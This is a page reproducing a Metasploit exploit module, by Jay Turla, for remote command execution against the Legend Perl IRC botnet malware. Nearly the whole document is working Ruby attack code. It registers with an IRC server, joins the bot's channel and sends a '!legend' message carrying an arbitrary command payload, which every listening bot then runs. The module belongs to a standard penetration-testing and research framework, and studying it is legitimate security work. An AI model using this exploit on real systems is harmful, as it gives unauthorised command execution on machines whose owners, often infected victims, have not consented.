#### Legend Perl IRC Bot

Type: Remote Code Execution

Author: [shipcod3 / Jay Turla](https://twitter.com/shipcod3)

```
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Legend Perl IRC Bot Remote Code Execution',
      'Description'    => %q{
          This module exploits a remote command execution on the Legend Perl IRC Bot .
          This bot has been used as a payload in the Shellshock spam last October 2014.
          This particular bot has functionalities like NMAP scanning, TCP, HTTP, SQL, and
          UDP flooding, the ability to remove system logs, and ability to gain root, and
          VNC scanning.

          Kevin Stevens, a Senior Threat Researcher at Damballa  has uploaded this script
          to VirusTotal with a md5 of 11a9f1589472efa719827079c3d13f76.
        },
      'Author'         =>
        [
          'Jay Turla' # msf and initial discovery
          #MalwareMustDie
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'OSVDB', '121681' ],
          [ 'EDB', '36836' ],
          [ 'URL', 'https://www.damballa.com/perlbotnado/' ],
          [ 'URL', 'http://www.csoonline.com/article/2839054/vulnerabilities/report-criminals-use-shellshock-against-mail-servers-to-build-botnet.html' ] # Shellshock spam October 2014 details
        ],
      'Platform'       => %w{ unix win },
      'Arch'           => ARCH_CMD,
      'Payload'        =>
        {
          'Space'    => 300, # According to RFC 2812, the max length message is 512, including the cr-lf
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd'
            }
        },
      'Targets'  =>
        [
          [ 'Legend IRC Bot', { } ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Apr 27 2015',
      'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(6667),
        OptString.new('IRC_PASSWORD', [false, 'IRC Connection Password', '']),
        OptString.new('NICK', [true, 'IRC Nickname', 'msf_user']),
        OptString.new('CHANNEL', [true, 'IRC Channel', '#channel'])
      ], self.class)
  end

  def check
    connect

    res = register(sock)
    if res =~ /463/ || res =~ /464/
      vprint_error("#{rhost}:#{rport} - Connection to the IRC Server not allowed")
      return Exploit::CheckCode::Unknown
    end

    res = join(sock)
    if !res =~ /353/ && !res =~ /366/
      vprint_error("#{rhost}:#{rport} - Error joining the #{datastore['CHANNEL']} channel")
      return Exploit::CheckCode::Unknown
    end

    quit(sock)
    disconnect

    if res =~ /auth/ && res =~ /logged in/
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def send_msg(sock, data)
    sock.put(data)
    data = ""
    begin
      read_data = sock.get_once(-1, 1)
      while !read_data.nil?
        data << read_data
        read_data = sock.get_once(-1, 1)
      end
    rescue ::EOFError, ::Timeout::Error, ::Errno::ETIMEDOUT => e
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
    end

    data
  end

  def register(sock)
    msg = ""

    if datastore['IRC_PASSWORD'] && !datastore['IRC_PASSWORD'].empty?
      msg << "PASS #{datastore['IRC_PASSWORD']}\r\n"
    end

    if datastore['NICK'].length > 9
      nick = rand_text_alpha(9)
      print_error("The nick is longer than 9 characters, using #{nick}")
    else
      nick = datastore['NICK']
    end

    msg << "NICK #{nick}\r\n"
    msg << "USER #{nick} #{Rex::Socket.source_address(rhost)} #{rhost} :#{nick}\r\n"

    send_msg(sock,msg)
  end

  def join(sock)
    join_msg = "JOIN #{datastore['CHANNEL']}\r\n"
    send_msg(sock, join_msg)
  end

  def legend_command(sock)
    encoded = payload.encoded
    command_msg = "PRIVMSG #{datastore['CHANNEL']} :!legend #{encoded}\r\n"
    send_msg(sock, command_msg)
  end

  def quit(sock)
    quit_msg = "QUIT :bye bye\r\n"
    sock.put(quit_msg)
  end

  def exploit
    connect

    print_status("#{rhost}:#{rport} - Registering with the IRC Server...")
    res = register(sock)
    if res =~ /463/ || res =~ /464/
      print_error("#{rhost}:#{rport} - Connection to the IRC Server not allowed")
      return
    end

    print_status("#{rhost}:#{rport} - Joining the #{datastore['CHANNEL']} channel...")
    res = join(sock)
    if !res =~ /353/ && !res =~ /366/
      print_error("#{rhost}:#{rport} - Error joining the #{datastore['CHANNEL']} channel")
      return
    end

    print_status("#{rhost}:#{rport} - Exploiting the malicious IRC bot...")
    legend_command(sock)

    quit(sock)
    disconnect
  end

end
```

**Reference:** https://www.rapid7.com/db/modules/exploit/multi/misc/legend_bot_exec